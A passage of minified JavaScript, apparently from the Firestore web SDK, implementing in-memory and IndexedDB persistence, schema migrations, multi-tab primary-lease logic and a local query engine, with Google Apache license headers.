n=n.delete(i),this.referenceDelegate.markPotentiallyOrphaned(e,r.key)})).next((()=>{this.Rs=n}))}Dn(e){}containsKey(e,t){const n=new Rt(t,0),r=this.Rs.firstAfterOrEqual(n);return C.resolve(t.isEqual(r&&r.key))}performConsistencyCheck(e){return this.mutationQueue.length,C.resolve()}Vs(e,t){return this.Ps(e)}Ps(e){return 0===this.mutationQueue.length?0:e-this.mutationQueue[0].batchId}vs(e){const t=this.Ps(e);return t<0||t>=this.mutationQueue.length?null:this.mutationQueue[t]}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class CL{constructor(e){this.Ss=e,this.docs=new Be(B.comparator),this.size=0}setIndexManager(e){this.indexManager=e}addEntry(e,t){const n=t.key,r=this.docs.get(n),i=r?r.size:0,s=this.Ss(t);return this.docs=this.docs.insert(n,{document:t.mutableCopy(),size:s}),this.size+=s-i,this.indexManager.addToCollectionParentIndex(e,n.path.popLast())}removeEntry(e){const t=this.docs.get(e);t&&(this.docs=this.docs.remove(e),this.size-=t.size)}getEntry(e,t){const n=this.docs.get(t);return C.resolve(n?n.document.mutableCopy():We.newInvalidDocument(t))}getEntries(e,t){let n=_n();return t.forEach((e=>{const t=this.docs.get(e);n=n.insert(e,t?t.document.mutableCopy():We.newInvalidDocument(e))})),C.resolve(n)}getDocumentsMatchingQuery(e,t,n,r){let i=_n();const s=t.path,o=new B(s.child("")),a=this.docs.getIteratorFrom(o);for(;a.hasNext();){const{key:e,value:{document:o}}=a.getNext();if(!s.isPrefixOf(e.path))break;e.path.length>s.length+1||Jy(QT(o),n)<=0||(r.has(o.key)||Lu(t,o))&&(i=i.insert(o.key,o.mutableCopy()))}return C.resolve(i)}getAllFromCollectionGroup(e,t,n,r){G()}Ds(e,t){return C.forEach(this.docs,(e=>t(e)))}newChangeBuffer(e){return new NL(this)}getSize(e){return C.resolve(this.size)}}class NL extends eI{constructor(e){super(),this.rs=e}applyChanges(e){const t=[];return this.changes.forEach(((n,r)=>{r.isValidDocument()?t.push(this.rs.addEntry(e,r)):this.rs.removeEntry(n)})),C.waitFor(t)}getFromCache(e,t){return this.rs.getEntry(e,t)}getAllFromCache(e,t){return this.rs.getEntries(e,t)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ML{constructor(e){this.persistence=e,this.Cs=new Ji((e=>zs(e)),Pu),this.lastRemoteSnapshotVersion=ee.min(),this.highestTargetId=0,this.xs=0,this.Ns=new mv,this.targetCount=0,this.ks=Ws.Nn()}forEachTarget(e,t){return this.Cs.forEach(((e,n)=>t(n))),C.resolve()}getLastRemoteSnapshotVersion(e){return C.resolve(this.lastRemoteSnapshotVersion)}getHighestSequenceNumber(e){return C.resolve(this.xs)}allocateTargetId(e){return this.highestTargetId=this.ks.next(),C.resolve(this.highestTargetId)}setTargetsMetadata(e,t,n){return n&&(this.lastRemoteSnapshotVersion=n),t>this.xs&&(this.xs=t),C.resolve()}$n(e){this.Cs.set(e.target,e);const t=e.targetId;t>this.highestTargetId&&(this.ks=new Ws(t),this.highestTargetId=t),e.sequenceNumber>this.xs&&(this.xs=e.sequenceNumber)}addTargetData(e,t){return this.$n(t),this.targetCount+=1,C.resolve()}updateTargetData(e,t){return this.$n(t),C.resolve()}removeTargetData(e,t){return this.Cs.delete(t.target),this.Ns.ps(t.targetId),this.targetCount-=1,C.resolve()}removeTargets(e,t,n){let r=0;const i=[];return this.Cs.forEach(((s,o)=>{o.sequenceNumber<=t&&null===n.get(o.targetId)&&(this.Cs.delete(s),i.push(this.removeMatchingKeysForTargetId(e,o.targetId)),r++)})),C.waitFor(i).next((()=>r))}getTargetCount(e){return C.resolve(this.targetCount)}getTargetData(e,t){const n=this.Cs.get(t)||null;return C.resolve(n)}addMatchingKeys(e,t,n){return this.Ns.ws(t,n),C.resolve()}removeMatchingKeys(e,t,n){this.Ns.ys(t,n);const r=this.persistence.referenceDelegate,i=[];return r&&t.forEach((t=>{i.push(r.markPotentiallyOrphaned(e,t))})),C.waitFor(i)}removeMatchingKeysForTargetId(e,t){return this.Ns.ps(t),C.resolve()}getMatchingKeysForTargetId(e,t){const n=this.Ns.Ts(t);return C.resolve(n)}containsKey(e,t){return C.resolve(this.Ns.containsKey(t))}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class rI{constructor(e,t){this.Ms={},this.overlays={},this.Os=new wn(0),this.$s=!1,this.$s=!0,this.referenceDelegate=e(this),this.Fs=new ML(this),this.indexManager=new pL,this.remoteDocumentCache=new CL((e=>this.referenceDelegate.Bs(e))),this.serializer=new Gx(t),this.Ls=new IL(this.serializer)}start(){return Promise.resolve()}shutdown(){return this.$s=!1,Promise.resolve()}get started(){return this.$s}setDatabaseDeletedListener(){}setNetworkEnabled(){}getIndexManager(e){return this.indexManager}getDocumentOverlayCache(e){let t=this.overlays[e.toKey()];return t||(t=new kL,this.overlays[e.toKey()]=t),t}getMutationQueue(e,t){let n=this.Ms[e.toKey()];return n||(n=new DL(t,this.referenceDelegate),this.Ms[e.toKey()]=n),n}getTargetCache(){return this.Fs}getRemoteDocumentCache(){return this.remoteDocumentCache}getBundleCache(){return this.Ls}runTransaction(e,t,n){V("MemoryPersistence","Starting transaction:",e);const r=new RL(this.Os.next());return this.referenceDelegate.qs(),n(r).next((e=>this.referenceDelegate.Us(r).next((()=>e)))).toPromise().then((e=>(r.raiseOnCommittedEvent(),e)))}Ks(e,t){return C.or(Object.values(this.Ms).map((n=>()=>n.containsKey(e,t))))}}class RL extends JT{constructor(e){super(),this.currentSequenceNumber=e}}class Xd{constructor(e){this.persistence=e,this.Gs=new mv,this.Qs=null}static js(e){return new Xd(e)}get zs(){if(this.Qs)return this.Qs;throw G()}addReference(e,t,n){return this.Gs.addReference(n,t),this.zs.delete(n.toString()),C.resolve()}removeReference(e,t,n){return this.Gs.removeReference(n,t),this.zs.add(n.toString()),C.resolve()}markPotentiallyOrphaned(e,t){return this.zs.add(t.toString()),C.resolve()}removeTarget(e,t){this.Gs.ps(t.targetId).forEach((e=>this.zs.add(e.toString())));const n=this.persistence.getTargetCache();return n.getMatchingKeysForTargetId(e,t.targetId).next((e=>{e.forEach((e=>this.zs.add(e.toString())))})).next((()=>n.removeTargetData(e,t)))}qs(){this.Qs=new Set}Us(e){const t=this.persistence.getRemoteDocumentCache().newChangeBuffer();return C.forEach(this.zs,(n=>{const r=B.fromPath(n);return this.Ws(e,r).next((e=>{e||t.removeEntry(r,ee.min())}))})).next((()=>(this.Qs=null,t.apply(e))))}updateLimboDocument(e,t){return this.Ws(e,t).next((e=>{e?this.zs.delete(t.toString()):this.zs.add(t.toString())}))}Bs(e){return 0}Ws(e,t){return C.or([()=>C.resolve(this.Gs.containsKey(t)),()=>this.persistence.getTargetCache().containsKey(e,t),()=>this.persistence.Ks(e,t)])}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class AL{constructor(e){this.serializer=e}$(e,t,n,r){const i=new qd("createOrUpgrade",t);n<1&&r>=1&&(e.createObjectStore("owner"),function(e){e.createObjectStore("mutationQueues",{keyPath:"userId"}),e.createObjectStore("mutations",{keyPath:"batchId",autoIncrement:!0}).createIndex("userMutationsIndex",zw,{unique:!0}),e.createObjectStore("documentMutations")}(e),kS(e),function(e){e.createObjectStore("remoteDocuments")}(e));let s=C.resolve();return n<3&&r>=3&&(0!==n&&(function(e){e.deleteObjectStore("targetDocuments"),e.deleteObjectStore("targets"),e.deleteObjectStore("targetGlobal")}(e),kS(e)),s=s.next((()=>function(e){const t=e.store("targetGlobal"),n={highestTargetId:0,highestListenSequenceNumber:0,lastRemoteSnapshotVersion:ee.min().toTimestamp(),targetCount:0};return t.put("targetGlobalKey",n)}(i)))),n<4&&r>=4&&(0!==n&&(s=s.next((()=>function(e,t){return t.store("mutations").j().next((n=>{e.deleteObjectStore("mutations"),e.createObjectStore("mutations",{keyPath:"batchId",autoIncrement:!0}).createIndex("userMutationsIndex",zw,{unique:!0});const r=t.store("mutations"),i=n.map((e=>r.put(e)));return C.waitFor(i)}))}(e,i)))),s=s.next((()=>{!function(e){e.createObjectStore("clientMetadata",{keyPath:"clientId"})}(e)}))),n<5&&r>=5&&(s=s.next((()=>this.Js(i)))),n<6&&r>=6&&(s=s.next((()=>(function(e){e.createObjectStore("remoteDocumentGlobal")}(e),this.Ys(i))))),n<7&&r>=7&&(s=s.next((()=>this.Xs(i)))),n<8&&r>=8&&(s=s.next((()=>this.Zs(e,i)))),n<9&&r>=9&&(s=s.next((()=>{!function(e){e.objectStoreNames.contains("remoteDocumentChanges")&&e.deleteObjectStore("remoteDocumentChanges")}(e)}))),n<10&&r>=10&&(s=s.next((()=>this.ti(i)))),n<11&&r>=11&&(s=s.next((()=>{(function(e){e.createObjectStore("bundles",{keyPath:"bundleId"})})(e),function(e){e.createObjectStore("namedQueries",{keyPath:"name"})}(e)}))),n<12&&r>=12&&(s=s.next((()=>{!function(e){const t=e.createObjectStore("documentOverlays",{keyPath:m$});t.createIndex("collectionPathOverlayIndex",g$,{unique:!1}),t.createIndex("collectionGroupOverlayIndex",y$,{unique:!1})}(e)}))),n<13&&r>=13&&(s=s.next((()=>function(e){const t=e.createObjectStore("remoteDocumentsV14",{keyPath:i$});t.createIndex("documentKeyIndex",s$),t.createIndex("collectionGroupIndex",o$)}(e))).next((()=>this.ei(e,i))).next((()=>e.deleteObjectStore("remoteDocuments")))),n<14&&r>=14&&(s=s.next((()=>this.ni(e,i)))),n<15&&r>=15&&(s=s.next((()=>function(e){e.createObjectStore("indexConfiguration",{keyPath:"indexId",autoIncrement:!0}).createIndex("collectionGroupIndex","collectionGroup",{unique:!1}),e.createObjectStore("indexState",{keyPath:h$}).createIndex("sequenceNumberIndex",d$,{unique:!1}),e.createObjectStore("indexEntries",{keyPath:f$}).createIndex("documentKeyIndex",p$,{unique:!1})}(e)))),s}Ys(e){let t=0;return e.store("remoteDocuments").X(((e,n)=>{t+=ed(n)})).next((()=>{const n={byteSize:t};return e.store("remoteDocumentGlobal").put("remoteDocumentGlobalKey",n)}))}Js(e){const t=e.store("mutationQueues"),n=e.store("mutations");return t.j().next((t=>C.forEach(t,(t=>{const r=IDBKeyRange.bound([t.userId,-1],[t.userId,t.lastAcknowledgedBatchId]);return n.j("userMutationsIndex",r).next((n=>C.forEach(n,(n=>{te(n.userId===t.userId);const r=ms(this.serializer,n);return Xx(e,t.userId,r).next((()=>{}))}))))}))))}Xs(e){const t=e.store("targetDocuments"),n=e.store("remoteDocuments");return e.store("targetGlobal").get("targetGlobalKey").next((e=>{const r=[];return n.X(((n,i)=>{const s=new Te(n),o=[0,dn(s)];r.push(t.get(o).next((n=>{return n?C.resolve():(r=s,t.put({targetId:0,path:dn(r),sequenceNumber:e.highestListenSequenceNumber}));var r})))})).next((()=>C.waitFor(r)))}))}Zs(e,t){e.createObjectStore("collectionParents",{keyPath:c$});const n=t.store("collectionParents"),r=new pv,i=e=>{if(r.add(e)){const t=e.lastSegment(),r=e.popLast();return n.put({collectionId:t,parent:dn(r)})}};return t.store("remoteDocuments").X({Y:!0},((e,t)=>{const n=new Te(e);return i(n.popLast())})).next((()=>t.store("documentMutations").X({Y:!0},(([e,t,n],r)=>{const s=pr(t);return i(s.popLast())}))))}ti(e){const t=e.store("targets");return t.X(((e,n)=>{const r=hl(n),i=Hx(this.serializer,r);return t.put(i)}))}ei(e,t){const n=t.store("remoteDocuments"),r=[];return n.X(((e,n)=>{const i=t.store("remoteDocumentsV14"),s=(o=n,o.document?new B(Te.fromString(o.document.name).popFirst(5)):o.noDocument?B.fromSegments(o.noDocument.path):o.unknownDocument?B.fromSegments(o.unknownDocument.path):G()).path.toArray();var o;
/**
* @license
* Copyright 2017 Google LLC
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
*   http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/const a={prefixPath:s.slice(0,s.length-2),collectionGroup:s[s.length-2],documentId:s[s.length-1],readTime:n.readTime||[0,0],unknownDocument:n.unknownDocument,noDocument:n.noDocument,document:n.document,hasCommittedMutations:!!n.hasCommittedMutations};r.push(i.put(a))})).next((()=>C.waitFor(r)))}ni(e,t){const n=t.store("mutations"),r=tI(this.serializer),i=new rI(Xd.js,this.serializer.le);return n.j().next((e=>{const n=new Map;return e.forEach((e=>{var t;let r=null!==(t=n.get(e.userId))&&void 0!==t?t:ce();ms(this.serializer,e).keys().forEach((e=>r=r.add(e))),n.set(e.userId,r)})),C.forEach(n,((e,n)=>{const s=new bt(n),o=Kd.fe(this.serializer,s),a=i.getIndexManager(s),l=Qd.fe(s,this.serializer,a,i.referenceDelegate);return new nI(r,l,o,a).recalculateAndSaveOverlaysForDocumentKeys(new Jm(t,wn.ct),e).next()}))}))}}function kS(e){e.createObjectStore("targetDocuments",{keyPath:l$}).createIndex("documentTargetsIndex",u$,{unique:!0}),e.createObjectStore("targets",{keyPath:"targetId"}).createIndex("queryTargetsIndex",a$,{unique:!0}),e.createObjectStore("targetGlobal")}const Dp="Failed to obtain exclusive access to the persistence layer. To allow shared access, multi-tab synchronization has to be enabled in all tabs. If you are using `experimentalForceOwningTab:true`, make sure that only one tab has persistence enabled at any given time.";class gv{constructor(e,t,n,r,i,s,o,a,l,u,c=15){if(this.allowTabSynchronization=e,this.persistenceKey=t,this.clientId=n,this.si=i,this.window=s,this.document=o,this.ii=l,this.ri=u,this.oi=c,this.Os=null,this.$s=!1,this.isPrimary=!1,this.networkEnabled=!0,this.ui=null,this.inForeground=!1,this.ci=null,this.ai=null,this.hi=Number.NEGATIVE_INFINITY,this.li=e=>Promise.resolve(),!gv.D())throw new L(M.UNIMPLEMENTED,"This platform is either missing IndexedDB or is known to have an incomplete implementation. Offline persistence has been disabled.");this.referenceDelegate=new _L(this,r),this.fi=t+"main",this.serializer=new Gx(a),this.di=new er(this.fi,this.oi,new AL(this.serializer)),this.Fs=new gL(this.referenceDelegate,this.serializer),this.remoteDocumentCache=tI(this.serializer),this.Ls=new aL,this.window&&this.window.localStorage?this._i=this.window.localStorage:(this._i=null,!1===u&&mt("IndexedDbPersistence","LocalStorage is unavailable. As a result, persistence may not work reliably. In particular enablePersistence() could fail immediately after refreshing the page."))}start(){return this.wi().then((()=>{if(!this.isPrimary&&!this.allowTabSynchronization)throw new L(M.FAILED_PRECONDITION,Dp);return this.mi(),this.gi(),this.yi(),this.runTransaction("getHighestListenSequenceNumber","readonly",(e=>this.Fs.getHighestSequenceNumber(e)))})).then((e=>{this.Os=new wn(e,this.ii)})).then((()=>{this.$s=!0})).catch((e=>(this.di&&this.di.close(),Promise.reject(e))))}pi(e){return this.li=async t=>{if(this.started)return e(t)},e(this.isPrimary)}setDatabaseDeletedListener(e){this.di.B((async t=>{null===t.newVersion&&await e()}))}setNetworkEnabled(e){this.networkEnabled!==e&&(this.networkEnabled=e,this.si.enqueueAndForget((async()=>{this.started&&await this.wi()})))}wi(){return this.runTransaction("updateClientMetadataAndTryBecomePrimary","readwrite",(e=>$c(e).put({clientId:this.clientId,updateTimeMs:Date.now(),networkEnabled:this.networkEnabled,inForeground:this.inForeground}).next((()=>{if(this.isPrimary)return this.Ii(e).next((e=>{e||(this.isPrimary=!1,this.si.enqueueRetryable((()=>this.li(!1))))}))})).next((()=>this.Ti(e))).next((t=>this.isPrimary&&!t?this.Ei(e).next((()=>!1)):!!t&&this.Ai(e).next((()=>!0)))))).catch((e=>{if(Xi(e))return V("IndexedDbPersistence","Failed to extend owner lease: ",e),this.isPrimary;if(!this.allowTabSynchronization)throw e;return V("IndexedDbPersistence","Releasing owner lease after error during lease refresh",e),!1})).then((e=>{this.isPrimary!==e&&this.si.enqueueRetryable((()=>this.li(e))),this.isPrimary=e}))}Ii(e){return nl(e).get("owner").next((e=>C.resolve(this.Ri(e))))}vi(e){return $c(e).delete(this.clientId)}async Pi(){if(this.isPrimary&&!this.bi(this.hi,18e5)){this.hi=Date.now();const e=await this.runTransaction("maybeGarbageCollectMultiClientState","readwrite-primary",(e=>{const t=Ft(e,"clientMetadata");return t.j().next((e=>{const n=this.Vi(e,18e5),r=e.filter((e=>-1===n.indexOf(e)));return C.forEach(r,(e=>t.delete(e.clientId))).next((()=>r))}))})).catch((()=>[]));if(this._i)for(const t of e)this._i.removeItem(this.Si(t.clientId))}}yi(){this.ai=this.si.enqueueAfterDelay("client_metadata_refresh",4e3,(()=>this.wi().then((()=>this.Pi())).then((()=>this.yi()))))}Ri(e){return!!e&&e.ownerId===this.clientId}Ti(e){return this.ri?C.resolve(!0):nl(e).get("owner").next((t=>{if(null!==t&&this.bi(t.leaseTimestampMs,5e3)&&!this.Di(t.ownerId)){if(this.Ri(t)&&this.networkEnabled)return!0;if(!this.Ri(t)){if(!t.allowTabSynchronization)throw new L(M.FAILED_PRECONDITION,Dp);return!1}}return!(!this.networkEnabled||!this.inForeground)||$c(e).j().next((e=>void 0===this.Vi(e,5e3).find((e=>{if(this.clientId!==e.clientId){const t=!this.networkEnabled&&e.networkEnabled,n=!this.inForeground&&e.inForeground,r=this.networkEnabled===e.networkEnabled;if(t||n&&r)return!0}return!1}))))})).next((e=>(this.isPrimary!==e&&V("IndexedDbPersistence",`Client ${e?"is":"is not"} eligible for a primary lease.`),e)))}async shutdown(){this.$s=!1,this.Ci(),this.ai&&(this.ai.cancel(),this.ai=null),this.xi(),this.Ni(),await this.di.runTransaction("shutdown","readwrite",["owner","clientMetadata"],(e=>{const t=new Jm(e,wn.ct);return this.Ei(t).next((()=>this.vi(t)))})),this.di.close(),this.ki()}Vi(e,t){return e.filter((e=>this.bi(e.updateTimeMs,t)&&!this.Di(e.clientId)))}Mi(){return this.runTransaction("getActiveClients","readonly",(e=>$c(e).j().next((e=>this.Vi(e,18e5).map((e=>e.clientId))))))}get started(){return this.$s}getMutationQueue(e,t){return Qd.fe(e,this.serializer,t,this.referenceDelegate)}getTargetCache(){return this.Fs}getRemoteDocumentCache(){return this.remoteDocumentCache}getIndexManager(e){return new mL(e,this.serializer.le.databaseId)}getDocumentOverlayCache(e){return Kd.fe(this.serializer,e)}getBundleCache(){return this.Ls}runTransaction(e,t,n){V("IndexedDbPersistence","Starting transaction:",e);const r="readonly"===t?"readonly":"readwrite",i=15===(s=this.oi)?w$:14===s?rx:13===s?nx:12===s?v$:11===s?tx:void G();var s;let o;return this.di.runTransaction(e,r,i,(r=>(o=new Jm(r,this.Os?this.Os.next():wn.ct),"readwrite-primary"===t?this.Ii(o).next((e=>!!e||this.Ti(o))).next((t=>{if(!t)throw mt(`Failed to obtain primary lease for action '${e}'.`),this.isPrimary=!1,this.si.enqueueRetryable((()=>this.li(!1))),new L(M.FAILED_PRECONDITION,XT);return n(o)})).next((e=>this.Ai(o).next((()=>e)))):this.Oi(o).next((()=>n(o)))))).then((e=>(o.raiseOnCommittedEvent(),e)))}Oi(e){return nl(e).get("owner").next((e=>{if(null!==e&&this.bi(e.leaseTimestampMs,5e3)&&!this.Di(e.ownerId)&&!this.Ri(e)&&!(this.ri||this.allowTabSynchronization&&e.allowTabSynchronization))throw new L(M.FAILED_PRECONDITION,Dp)}))}Ai(e){const t={ownerId:this.clientId,allowTabSynchronization:this.allowTabSynchronization,leaseTimestampMs:Date.now()};return nl(e).put("owner",t)}static D(){return er.D()}Ei(e){const t=nl(e);return t.get("owner").next((e=>this.Ri(e)?(V("IndexedDbPersistence","Releasing primary lease."),t.delete("owner")):C.resolve()))}bi(e,t){const n=Date.now();return!(e<n-t||e>n&&(mt(`Detected an update time that is in the future: ${e} > ${n}`),1))}mi(){null!==this.document&&"function"==typeof this.document.addEventListener&&(this.ci=()=>{this.si.enqueueAndForget((()=>(this.inForeground="visible"===this.document.visibilityState,this.wi())))},this.document.addEventListener("visibilitychange",this.ci),this.inForeground="visible"===this.document.visibilityState)}xi(){this.ci&&(this.document.removeEventListener("visibilitychange",this.ci),this.ci=null)}gi(){var e;"function"==typeof(null===(e=this.window)||void 0===e?void 0:e.addEventListener)&&(this.ui=()=>{this.Ci();const e=/(?:Version|Mobile)\/1[456]/;uO()&&(navigator.appVersion.match(e)||navigator.userAgent.match(e))&&this.si.enterRestrictedMode(!0),this.si.enqueueAndForget((()=>this.shutdown()))},this.window.addEventListener("pagehide",this.ui))}Ni(){this.ui&&(this.window.removeEventListener("pagehide",this.ui),this.ui=null)}Di(e){var t;try{const n=null!==(null===(t=this._i)||void 0===t?void 0:t.getItem(this.Si(e)));return V("IndexedDbPersistence",`Client '${e}' ${n?"is":"is not"} zombied in LocalStorage`),n}catch(e){return mt("IndexedDbPersistence","Failed to get zombied client id.",e),!1}}Ci(){if(this._i)try{this._i.setItem(this.Si(this.clientId),String(Date.now()))}catch(e){mt("Failed to set zombie client id.",e)}}ki(){if(this._i)try{this._i.removeItem(this.Si(this.clientId))}catch{}}Si(e){return`firestore_zombie_${this.persistenceKey}_${e}`}}function nl(e){return Ft(e,"owner")}function $c(e){return Ft(e,"clientMetadata")}function yv(e,t){let n=e.projectId;return e.isDefaultDatabase||(n+="."+e.database),"firestore/"+t+"/"+n+"/"}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vv{constructor(e,t,n,r){this.targetId=e,this.fromCache=t,this.$i=n,this.Fi=r}static Bi(e,t){let n=ce(),r=ce();for(const e of t.docChanges)switch(e.type){case 0:n=n.add(e.doc.key);break;case 1:r=r.add(e.doc.key)}return new vv(e,t.fromCache,n,r)}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class iI{constructor(){this.Li=!1}initialize(e,t){this.qi=e,this.indexManager=t,this.Li=!0}getDocumentsMatchingQuery(e,t,n,r){return this.Ui(e,t).next((i=>i||this.Ki(e,t,r,n))).next((n=>n||this.Gi(e,t)))}Ui(e,t){if(Zw(t))return C.resolve(null);let n=kn(t);return this.indexManager.getIndexType(e,n).next((r=>0===r?null:(null!==t.limit&&1===r&&(t=Xh(t,null,"F"),n=kn(t)),this.indexManager.getDocumentsMatchingTarget(e,n).next((r=>{const i=ce(...r);return this.qi.getDocuments(e,i).next((r=>this.indexManager.getMinOffset(e,n).next((n=>{const s=this.Qi(t,r);return this.ji(t,s,i,n.readTime)?this.Ui(e,Xh(t,null,"F")):this.zi(e,s,t,n)}))))})))))}Ki(e,t,n,r){return Zw(t)||r.isEqual(ee.min())?this.Gi(e,t):this.qi.getDocuments(e,n).next((i=>{const s=this.Qi(t,i);return this.ji(t,s,n,r)?this.Gi(e,t):(Qm()<=Ce.DEBUG&&V("QueryEngine","Re-using previous result from %s to execute query: %s",r.toString(),sg(t)),this.zi(e,s,t,KT(r,-1)))}))}Qi(e,t){let n=new He(vx(e));return t.forEach(((t,r)=>{Lu(e,r)&&(n=n.add(r))})),n}ji(e,t,n,r){if(null===e.limit)return!1;if(n.size!==t.size)return!0;const i="F"===e.limitType?t.last():t.first();return!!i&&(i.hasPendingWrites||i.version.compareTo(r)>0)}Gi(e,t){return Qm()<=Ce.DEBUG&&V("QueryEngine","Using full collection scan to execute query:",sg(t)),this.qi.getDocumentsMatchingQuery(e,t,An.min())}zi(e,t,n,r){return this.qi.getDocumentsMatchingQuery(e,n,r).next((e=>(t.forEach((t=>{e=e.insert(t.key,t)})),e)))}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bL{constructor(e,t,n,r){this.persistence=e,this.Wi=t,this.serializer=r,this.Hi=new Be(ue),this.Ji=new Ji((e=>zs(e)),Pu),this.Yi=new Map,this.Xi=e.getRemoteDocumentCache(),this.Fs=e.getTargetCache(),this.Ls=e.getBundleCache(),this.Zi(n)}Zi(e){this.documentOverlayCache=this.persistence.getDocumentOverlayCache(e),this.indexManager=this.persistence.getIndexManager(e),this.mutationQueue=this.persistence.getMutationQueue(e,this.indexManager),this.localDocuments=new nI(this.Xi,this.mutationQueue,this.documentOverlayCache,this.indexManager),this.Xi.setIndexManager(this.indexManager),this.Wi.initialize(this.localDocuments,this.indexManager)}collectGarbage(e){return this.persistence.runTransaction("Collect garbage","readwrite-primary",(t=>e.collect(t,this.Hi)))}}function sI(e,t,n,r){return new bL(e,t,n,r)}async function oI(e,t){const n=q(e);return await n.persistence.runTransaction("Handle user change","readonly",(e=>{let r;return n.mutationQueue.getAllMutationBatches(e).next((i=>(r=i,n.Zi(t),n.mutationQueue.getAllMutationBatches(e)))).next((t=>{const i=[],s=[];let o=ce();for(const e of r){i.push(e.batchId);for(const t of e.mutations)o=o.add(t.key)}for(const e of t){s.push(e.batchId);for(const t of e.mutations)o=o.add(t.key)}return n.localDocuments.getDocuments(e,o).next((e=>({tr:e,removedBatchIds:i,addedBatchIds:s})))}))}))}function OL(e,t){const n=q(e);return n.persistence.runTransaction("Acknowledge batch","readwrite-primary",(e=>{const r=t.batch.keys(),i=n.Xi.newChangeBuffer({trackRemovals:!0});return function(e,t,n,r){const i=n.batch,s=i.keys();let o=C.resolve();return s.forEach((e=>{o=o.next((()=>r.getEntry(t,e))).next((t=>{const s=n.docVersions.get(e);te(null!==s),t.version.compareTo(s)<0&&(i.applyToRemoteDocument(t,n),t.isValidDocument()&&(t.setReadTime(n.commitVersion),r.addEntry(t)))}))})),o.next((()=>e.mutationQueue.removeMutationBatch(t,i)))}(n,e,t,i).next((()=>i.apply(e))).next((()=>n.mutationQueue.performConsistencyCheck(e))).next((()=>n.documentOverlayCache.removeOverlaysForBatchId(e,r,t.batch.batchId))).next((()=>n.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(e,function(e){let t=ce();for(let n=0;n<e.mutationResults.length;++n)e.mutationResults[n].transformResults.length>0&&(t=t.add(e.batch.mutations[n].key));return t}(t)))).next((()=>n.localDocuments.getDocuments(e,r)))}))}function aI(e){const t=q(e);return t.persistence.runTransaction("Get last remote snapshot version","readonly",(e=>t.Fs.getLastRemoteSnapshotVersion(e)))}function PL(e,t){const n=q(e),r=t.snapshotVersion;let i=n.Hi;return n.persistence.runTransaction("Apply remote event","readwrite-primary",(e=>{const s=n.Xi.newChangeBuffer({trackRemovals:!0});i=n.Hi;const o=[];t.targetChanges.forEach(((s,a)=>{const l=i.get(a);if(!l)return;o.push(n.Fs.removeMatchingKeys(e,s.removedDocuments,a).next((()=>n.Fs.addMatchingKeys(e,s.addedDocuments,a))));let u=l.withSequenceNumber(e.currentSequenceNumber);var 